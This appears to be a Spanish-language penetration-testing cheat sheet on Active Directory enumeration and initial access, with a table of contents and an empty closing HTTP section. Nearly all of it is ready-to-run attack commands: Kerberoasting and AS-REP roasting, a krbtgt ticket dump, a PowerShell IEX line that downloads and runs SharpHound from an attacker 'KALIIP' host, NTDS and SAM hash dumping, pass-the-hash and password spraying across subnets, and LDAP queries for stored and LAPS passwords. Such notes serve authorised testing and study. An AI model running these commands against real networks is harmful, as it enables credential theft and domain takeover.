[[_TOC_]]

# Enumeracion y acceso inicial

## Herramientas
* Impacket 
* Responder
````
responder -I <interfaz> --lm -v
````
* Mimikatz
* CrackMapExec
* Kerbrute
````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
````
* Rubeus
````
.\Rubeus.exe kerberoast /creduser:domain.local\<usuario> /credpassword:<password>
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt
````
* GetNPUsers & GetUserSPNs
````
GetNPUsers.py domain.local/ -nopass -usersfile users.txt

GetUsersSPN.py domain.local/<usuario>:<password>
GetUsersSPN.py domain.local/<usuario>:<password> -request
````
* Invoke-Kerberoast.ps1
````
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat
````
* PowerView.ps1
* SharpHound.ps1
````
IEX((New-Object Net.WebClient).DownloadString('https://<KALIIP/SharpHound.ps1>')
Invoke-Bloodhound -CollectionMethod All
````
* Secretsdump
````
# NTDS dump
secretsdump.py -ntds ntds.dit -system system local 

# SAM dump con autenticacion
secretsdump.py domain.local/<usuario>:<password>@<TARGET>
secretsdump.py -hashes :<hashNTLM> 'domain.local/<host>$@<domainname>'
````


## NMAP 

Al hacer un escaneo de puertos en un entorno de Active Directory en especial si el escaneo lo hacemos directamente contra el Domain Controller nos encontraremos los siguientes puertos:

+ TCP/UDP port 53: DNS
+ TCP/UDP port 88: Kerberos authentication
+ TCP/UDP port 135: RPC
+ TCP/UDP port 137-138: NetBIOS
+ TCP/UDP port 389: LDAP
+ TCP/UDP port 445: SMB
+ TCP/UDP port 464: Kerberos password change
+ TCP/UDP port 636: LDAP SSL
+ TCP/UDP port 3268-3269: Global catalog

Adicionalmente dependiendo del entorno AD este puede tener varias caracteristicas y componentes asi como interactuar con diferentes servicios y aplicaciones por lo que podemos encontrarnos mas puertos comunes:

+ TCP port 80: HTTP
+ TCP port 443: HTTPS
+ TCP port 445: SMB

De modo que tenemos dos maneras de conseguir acceso inicial al AD:
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio.

## SMB

````bash
nmap -p 445 --script=smb-enum* <TARGET>  # Principalmente nos interesa enumerar usuarios
nmap -p 445  --script=smb-vuln* <TARGET> # MS17-010, MS14-025
````

* SMBMap
````bash
smbmap -H <TARGET>
````

* smbclient
````bash
smbclient -L <TARGET> -N
````

* CrackMapExec
````bash
# Escaneo del target 
crackmapexec smb www.secbank.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb <TARGET> -u "" up ""

# Connect to target using local account
crackmapexec smb <TARGET> -u 'test' -p 'pass123' --local-auth

# Pass the hash contra subredes
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Fuerza bruta y Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
````

````bash
# Enumeración de usuarios
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --users

# Enumeracion de grupos de dominio
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --groups

# Enumeracion de usuarios locales
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --local-users

# Enumeracion de recursos compartidos locales
crackmapexec smb <TARGET> -u 'user' -p 'PASSWORD' --local-auth --shares

# Sesiones activas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --sessions

# Usuarios logeados
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --lusers

# Politica de contraseñas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --pass-pol
````

````bash
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````
## RPC

Null session

`rpcclient -U "" <TARGET> -N`

Autenticacion

`rpcclient -U "user%password" <TARGET>`

Enumeracion de usuarios y grupos
````bash
enumdomusers
enumdomgroups
queryuser <0xuser>
querygroupmem 0x200 # Miembros del grupo Domain Admins
rpcclient -U "" <TARGET> -N -c "enumdomusers" # One line comand
````
Enumeracion de impresoras

`enumprinters`

Enumeracion de descripciones

`rpcclient -U "" <TARGET> -N -c "querydispinfo"`

## LDAP

Lo primero es dumpear toda la informacion que contiene LDAP, buscaremos el DomainNamingContext el cual necesitaremos para otros comandos

````bash
nmap -n -sV --script "ldap* and not brute" <TARGET>
ldapsearch -x -b "dc=domain,dc=local" "*" -H "ldap://TARGET"
````

A partir de aqui podemos seguir enumerando con ldapsearch el cual nos permitira filtrar por los distintos campos de la informacion almacenada

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName: # Enumeracion de las cuentas de usuario
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=hutch,DC=offsec" | grep description # Enumeracion de las descripciones de los usuarios las cuales en ocasiones contienen informacion sensible
````
Para enumerar constraseñas necesitamos dar con el nombre correcto del campo que las contiene, algunos ejemplos:

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep Pwd
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep userPassword
````
Teniendo unas credenciales validas podriamos acceder a credenciales de mas alto nivel como las de administrador

`ldapsearch -D <user>@domain.local -w <password> -o ldif-wrap=no -b 'dc=domain,dc=local' -h domain.local "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd`

## HTTP/HTTPS
[[_TOC_]]
